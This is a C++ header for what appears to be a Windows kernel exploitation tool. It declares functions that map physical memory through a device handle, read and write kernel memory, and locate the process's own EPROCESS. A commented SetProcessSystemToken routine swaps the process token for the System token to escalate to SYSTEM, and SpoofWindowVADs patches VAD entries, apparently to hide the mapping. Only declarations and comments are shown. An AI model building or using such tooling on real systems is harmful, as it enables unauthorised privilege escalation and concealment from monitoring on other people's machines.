#pragma once
#include <windows.h>
#include "syscalls.h"
#include "symbols.h"

#define PHYS_WINDOW_BASE 0x80000000000ULL

bool SetupPhysWindow(HANDLE device, SyscallTable* sc, ULONG64 systemCr3, KernelOffsets* offsets);

ULONG64 WindowRead64(ULONG64 physAddr);
ULONG WindowRead32(ULONG64 physAddr);
BYTE WindowRead8(ULONG64 physAddr);
void WindowReadBuffer(ULONG64 physAddr, void* buffer, ULONG size);
void WindowWrite64(ULONG64 physAddr, ULONG64 value);
void WindowWriteBuffer(ULONG64 physAddr, void* buffer, ULONG size);

ULONG64 WindowVirtToPhys(ULONG64 cr3, ULONG64 virtualAddr);
void RestorePhysWindow();

// True when physAddr falls inside a mapped window chunk.
BOOL WindowContains(ULONG64 physAddr);

// Read a kernel pointer through the window, reporting why it failed instead of
// returning a 0 that a list walk would mistake for the end of the list.
ULONG64 WindowReadKernelPtr(ULONG64 cr3, ULONG64 va, const char* what);

// Number of VAD fields still patched (diagnostics for the crash reporter).
ULONG WindowVadPatchCount();
// Number of window chunks whose pages are all present, i.e. that can safely
// have their VAD truncated (see PrefaultWindow()).
ULONG WindowResidentChunks();

// Locate our EPROCESS through the window, falling back to recovering the
// PsActiveProcessHead from the System process when the PDB RVA is wrong.
bool WindowFindOurEprocess(ULONG64 systemCr3, KernelOffsets* offsets, ULONG64* outEprocVA);

// Make the *process* run as SYSTEM, not just this thread.
//
// SetThreadToken() only changes the thread's effective token: API calls made
// from this thread are checked as SYSTEM, but the process still carries the
// elevated admin token as its primary token, so anything that looks at the
// process (Task Manager, Process Explorer, a new child process, an audit log)
// still sees the original account. Swapping EPROCESS::Token for the System
// process's own token fixes the process identity itself.
//
// The System process holds a reference to that token for as long as it runs, so
// the borrowed token cannot be freed underneath us. The write is read back and
// the caller is told either way.
bool SetProcessSystemToken(ULONG64 systemCr3, KernelOffsets* offsets);

bool SpoofWindowVADs(HANDLE device, SyscallTable* sc, ULONG64 systemCr3, KernelOffsets* offsets);
